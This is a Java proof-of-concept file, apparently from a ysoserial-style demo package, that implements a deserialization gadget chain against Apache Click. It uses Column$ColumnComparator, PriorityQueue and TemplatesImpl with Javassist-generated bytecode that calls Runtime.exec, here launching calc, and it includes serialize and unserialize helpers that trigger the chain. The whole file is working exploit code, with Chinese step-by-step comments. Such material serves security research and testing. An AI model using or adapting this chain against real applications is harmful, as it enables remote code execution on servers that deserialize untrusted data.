package ysoserial.vulndemo;
/**
 * java.util.PriorityQueue.readObject()
 *       java.util.PriorityQueue.heapify()
 *         java.util.PriorityQueue.siftDown()
 *           java.util.PriorityQueue.siftDownUsingComparator()
 *             org.apache.click.control.Column$ColumnComparator.compare()
 *               org.apache.click.control.Column.getProperty()
 *                 org.apache.click.control.Column.getProperty()
 *                   org.apache.click.util.PropertyUtils.getValue()
 *                     org.apache.click.util.PropertyUtils.getObjectPropertyValue()
 *                       java.lang.reflect.Method.invoke()
 *                         com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()
 */

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.click.control.Column;
import org.apache.click.control.Table;


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Comparator;
import java.util.PriorityQueue;

public class Click_POC {
    public static String serialize(Object obj) throws Exception{
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(barr);
        outputStream.writeObject(obj);
        byte[] bytes = barr.toByteArray();
        barr.close();
        return Base64.getEncoder().encodeToString(bytes);
    }
    public static void unserialize(String base64) throws Exception{
        byte[] decode = Base64.getDecoder().decode(base64);
        ByteArrayInputStream barr = new ByteArrayInputStream(decode);
        ObjectInputStream inputStream = new ObjectInputStream(barr);
        inputStream.readObject();
    }
    public static byte[][] evilBytecodes() throws Exception{
        //通过javassist生成恶意bytecodes
        //cmd命令
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        ClassPool classPool = ClassPool.getDefault();
        //创建一个类
        CtClass ctClass = classPool.makeClass("ClickClass");
        //添加AbstractTranslet为父类
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        //添加命令
        ctClass.makeClassInitializer().insertBefore(cmd);
        //转为byte
        byte[] bytes = ctClass.toBytecode();
        return new byte[][]{bytes};
    }
    //反射赋值
    public static void setFieldValue(Object obj, String fieldname, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "RoboTerh");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", evilBytecodes());

        //反射创建comparator
        Class<?> aClass = Class.forName("org.apache.click.control.Column$ColumnComparator");
        Constructor<?> constructor = aClass.getDeclaredConstructor(Column.class);
        constructor.setAccessible(true);
        Column column = new Column("outputProperties");
        //为了避免比较的空指针，设置一个Table属性
        column.setTable(new Table());
        Comparator comparator = (Comparator) constructor.newInstance(column);

        //创建PriorityQueue对象
        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(1);

        //反射将TemplatesImpl放入priorityQueue中
        setFieldValue(priorityQueue, "queue", new Object[]{templates, templates});

        //反射将comparator放入,不能直接传入不然会报错误
        setFieldValue(priorityQueue, "comparator", comparator);

        String s = serialize(priorityQueue);
        System.out.println(s);

        unserialize(s);
    }
}
